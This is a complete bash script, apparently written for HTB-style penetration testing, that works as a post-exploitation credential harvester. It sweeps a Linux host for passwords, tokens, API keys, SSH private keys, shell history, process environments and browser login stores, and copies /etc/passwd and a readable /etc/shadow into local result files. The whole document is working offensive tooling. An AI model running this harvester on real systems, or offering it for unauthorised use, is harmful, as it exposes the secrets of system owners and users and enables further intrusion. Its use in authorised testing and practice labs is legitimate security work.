#!/bin/bash

# ============================================================
#  Linux Credential Hunter v1.1
#  Author : HTB-style post-exploitation credential scanner
#  Usage  : sudo ./cred_hunt.sh [all|quick]
# ============================================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

OUTDIR="./cred_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"

banner() {
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════╗"
    echo "║     Linux Credential Hunter v1.1         ║"
    echo "║     Usage: sudo ./cred_hunt.sh [mode]    ║"
    echo "╚══════════════════════════════════════════╝"
    echo -e "${NC}"
}

section() { echo -e "\n${YELLOW}[*] ===== $1 =====${NC}"; }
found()   { echo -e "${GREEN}[+] $1${NC}"; }
info()    { echo -e "${CYAN}[-] $1${NC}"; }

# ─────────────────────────────────────────────
# 1. CONFIGURATION FILES (.conf .config .cnf)
# ─────────────────────────────────────────────
hunt_configs() {
    section "Configuration files (.conf .config .cnf)"
    local outfile="$OUTDIR/01_configs.txt"

    for ext in .conf .config .cnf; do
        echo -e "\n--- Extension: $ext ---" >> "$outfile"
        while IFS= read -r f; do
            match=$(grep -iE "user|password|pass|secret|token|key" "$f" 2>/dev/null | grep -v "^#")
            if [ -n "$match" ]; then
                found "Found credential hint: $f"
                {
                    echo "== $f =="
                    echo "$match"
                    echo ""
                } >> "$outfile"
            fi
        done < <(find / -name "*$ext" 2>/dev/null | grep -v "lib\|fonts\|share\|core\|doc")
    done
    info "Results saved: $outfile"
}

# ─────────────────────────────────────────────
# 2. DATABASE FILES (.sql .db)
# ─────────────────────────────────────────────
hunt_databases() {
    section "Database files"
    local outfile="$OUTDIR/02_databases.txt"

    for ext in ".sql" ".db" ".*db" ".db*"; do
        echo -e "\n--- DB extension: $ext ---" >> "$outfile"
        while IFS= read -r f; do
            found "Found: $f"
            echo "$f" >> "$outfile"
        done < <(find / -name "*$ext" 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man")
    done
    info "Results saved: $outfile"
}

# ─────────────────────────────────────────────
# 3. NOTES (*.txt and extension-less files)
# ─────────────────────────────────────────────
hunt_notes() {
    section "Notes and plain-text files"
    local outfile="$OUTDIR/03_notes.txt"

    while IFS= read -r f; do
        match=$(grep -iE "pass|password|secret|token|key|cred" "$f" 2>/dev/null)
        if [ -n "$match" ]; then
            found "Credential keyword found: $f"
            {
                echo "== $f =="
                echo "$match"
            } >> "$outfile"
        fi
    done < <(find /home/* -type f \( -name "*.txt" -o ! -name "*.*" \) 2>/dev/null)
    info "Results saved: $outfile"
}

# ─────────────────────────────────────────────
# 4. SCRIPTS (.py .sh .php .pl .go .c .rb)
# ─────────────────────────────────────────────
hunt_scripts() {
    section "Script files"
    local outfile="$OUTDIR/04_scripts.txt"

    for ext in .py .pyc .pl .go .jar .c .sh .rb .php; do
        echo -e "\n--- Script: $ext ---" >> "$outfile"
        while IFS= read -r f; do
            match=$(grep -iE "password|passwd|secret|token|api_key|apikey|credential" "$f" 2>/dev/null \
                    | grep -v "^#\|^//\|^\*")
            if [ -n "$match" ]; then
                found "Hardcoded credential: $f"
                {
                    echo "== $f =="
                    echo "$match"
                    echo ""
                } >> "$outfile"
            fi
        done < <(find / -name "*$ext" 2>/dev/null | grep -v "doc\|lib\|headers\|share")
    done
    info "Results saved: $outfile"
}

# ─────────────────────────────────────────────
# 5. CRONJOBS
# ─────────────────────────────────────────────
hunt_cronjobs() {
    section "Cronjob files"
    local outfile="$OUTDIR/05_cronjobs.txt"

    {
        echo "=== /etc/crontab ==="
        cat /etc/crontab 2>/dev/null
    } >> "$outfile"

    for dir in /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.monthly /etc/cron.weekly; do
        {
            echo -e "\n=== $dir ==="
            ls -la "$dir" 2>/dev/null
        } >> "$outfile"
        if grep -rE "pass|password|secret|token" "$dir" 2>/dev/null >> "$outfile"; then
            found "Credential found in cronjob dir: $dir"
        fi
    done

    echo -e "\n=== User crontabs ===" >> "$outfile"
    while IFS=: read -r user _; do
        crontab -l -u "$user" 2>/dev/null | grep -v "^#" >> "$outfile"
    done < /etc/passwd

    info "Results saved: $outfile"
}

# ─────────────────────────────────────────────
# 6. SSH KEYS
# ─────────────────────────────────────────────
hunt_ssh_keys() {
    section "SSH keys and known_hosts"
    local outfile="$OUTDIR/06_ssh_keys.txt"

    while IFS= read -r f; do
        found "SSH key: $f"
        echo "$f" >> "$outfile"
    done < <(find / \( -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" \
                       -o -name "id_ed25519" -o -name "*.pem" -o -name "*.key" \) \
                   2>/dev/null | grep -v "share\|doc")

    {
        echo -e "\n--- known_hosts ---"
        find / -name "known_hosts" 2>/dev/null
        echo -e "\n--- authorized_keys ---"
        find / -name "authorized_keys" 2>/dev/null
    } >> "$outfile"

    info "Results saved: $outfile"
}

# ─────────────────────────────────────────────
# 7. BASH HISTORY
# ─────────────────────────────────────────────
hunt_history() {
    section "Shell history (.bash_history, .zsh_history)"
    local outfile="$OUTDIR/07_history.txt"

    for hfile in /home/*/.bash_history /home/*/.zsh_history \
                 /root/.bash_history /root/.zsh_history; do
        [ -f "$hfile" ] || continue
        {
            echo "=== $hfile ==="
        } >> "$outfile"
        while IFS= read -r line; do
            found "History hit [$hfile]: $line"
            echo "$line" >> "$outfile"
        done < <(grep -iE "pass|password|secret|token|--password|:.*@|mysql -u|ftp |ssh " "$hfile" 2>/dev/null)
        {
            echo "--- Last 20 lines ---"
            tail -n 20 "$hfile"
        } >> "$outfile"
    done

    for rcfile in /home/*/.bashrc /home/*/.bash_profile /home/*/.profile; do
        [ -f "$rcfile" ] || continue
        match=$(grep -iE "pass|export.*KEY|export.*TOKEN|export.*SECRET" "$rcfile" 2>/dev/null)
        if [ -n "$match" ]; then
            found "RC file hit: $rcfile"
            {
                echo "== $rcfile =="
                echo "$match"
            } >> "$outfile"
        fi
    done

    info "Results saved: $outfile"
}

# ─────────────────────────────────────────────
# 8. LOG FILES
# ─────────────────────────────────────────────
hunt_logs() {
    section "Log files"
    local outfile="$OUTDIR/08_logs.txt"

    for log in /var/log/syslog /var/log/auth.log /var/log/secure \
               /var/log/apache2/access.log /var/log/apache2/error.log \
               /var/log/nginx/access.log /var/log/nginx/error.log \
               /var/log/mysql/error.log /var/log/mail.log; do
        [ -f "$log" ] || continue
        match=$(grep -iE "password|fail.*pass|authentication failure|invalid user|accepted password" \
                "$log" 2>/dev/null | tail -n 20)
        if [ -n "$match" ]; then
            found "Interesting log entry: $log"
            {
                echo "== $log =="
                echo "$match"
                echo ""
            } >> "$outfile"
        fi
    done

    info "Results saved: $outfile"
}

# ─────────────────────────────────────────────
# 9. ENVIRONMENT VARIABLES
# ─────────────────────────────────────────────
hunt_env() {
    section "Environment variables"
    local outfile="$OUTDIR/09_env.txt"

    while IFS= read -r line; do
        found "ENV: $line"
        echo "$line" >> "$outfile"
    done < <(env 2>/dev/null | grep -iE "pass|password|secret|token|key|api")

    echo -e "\n--- /proc/*/environ ---" >> "$outfile"
    while IFS= read -r pid_env; do
        strings "$pid_env" 2>/dev/null \
            | grep -iE "pass|password|secret|token|api_key" >> "$outfile"
    done < <(find /proc -maxdepth 2 -name environ 2>/dev/null)

    info "Results saved: $outfile"
}

# ─────────────────────────────────────────────
# 10. BROWSER CREDENTIALS
# ─────────────────────────────────────────────
hunt_browser() {
    section "Browser credential stores"
    local outfile="$OUTDIR/10_browser.txt"

    while IFS= read -r f; do
        found "Firefox credential file: $f"
        echo "$f" >> "$outfile"
    done < <(find /home -name "key4.db" -o -name "cert9.db" -o -name "logins.json" 2>/dev/null)

    while IFS= read -r f; do
        found "Chrome Login Data: $f"
        echo "$f" >> "$outfile"
    done < <(find /home \( -path "*/Chrome/Default/Login Data" \
                         -o -path "*/chromium/Default/Login Data" \) 2>/dev/null)

    info "Results saved: $outfile"
}

# ─────────────────────────────────────────────
# 11. /etc/passwd & /etc/shadow
# ─────────────────────────────────────────────
hunt_passwd() {
    section "/etc/passwd and /etc/shadow"
    local outfile="$OUTDIR/11_passwd_shadow.txt"

    {
        echo "=== /etc/passwd ==="
        cat /etc/passwd
        echo -e "\n--- Users with login shell ---"
    } >> "$outfile"

    while IFS= read -r line; do
        found "Login user: $line"
        echo "$line" >> "$outfile"
    done < <(grep -vE "nologin|false" /etc/passwd)

    {
        echo -e "\n=== /etc/shadow ==="
    } >> "$outfile"

    if [ -r /etc/shadow ]; then
        tee -a "$outfile" < /etc/shadow
        found "/etc/shadow is readable!"
    else
        echo "Not readable (requires root)" >> "$outfile"
        info "/etc/shadow: permission denied"
    fi

    info "Results saved: $outfile"
}

# ─────────────────────────────────────────────
# 12. WORLD-READABLE SENSITIVE FILES
# ─────────────────────────────────────────────
hunt_world_readable() {
    section "World-readable sensitive files"
    local outfile="$OUTDIR/12_world_readable.txt"

    while IFS= read -r f; do
        found "World-readable: $f"
        echo "$f" >> "$outfile"
    done < <(find / -readable -type f 2>/dev/null \
        | grep -iE "password|credential|secret|shadow|\.env|wp-config|config\.php|database\.yml|settings\.py" \
        | grep -v "proc\|sys\|dev")

    info "Results saved: $outfile"
}

# ─────────────────────────────────────────────
# SUMMARY
# ─────────────────────────────────────────────
summary() {
    section "SCAN COMPLETE"
    echo -e "${GREEN}"
    echo "╔══════════════════════════════════════════════════╗"
    echo "║  All results saved to:                           ║"
    printf "║  %-49s║\n" "$OUTDIR"
    echo "╠══════════════════════════════════════════════════╣"
    while IFS= read -r f; do
        printf "║    - %-44s║\n" "$f"
    done < <(find "$OUTDIR" -maxdepth 1 -name "*.txt" -printf "%f\n" | sort)
    echo "╚══════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
banner

MODE="${1:-all}"

case "$MODE" in
    quick)
        info "QUICK mode: running core checks only"
        hunt_passwd
        hunt_history
        hunt_env
        hunt_configs
        ;;
    all|*)
        info "FULL mode: scanning all categories..."
        hunt_configs
        hunt_databases
        hunt_notes
        hunt_scripts
        hunt_cronjobs
        hunt_ssh_keys
        hunt_history
        hunt_logs
        hunt_env
        hunt_browser
        hunt_passwd
        hunt_world_readable
        ;;
esac

summary
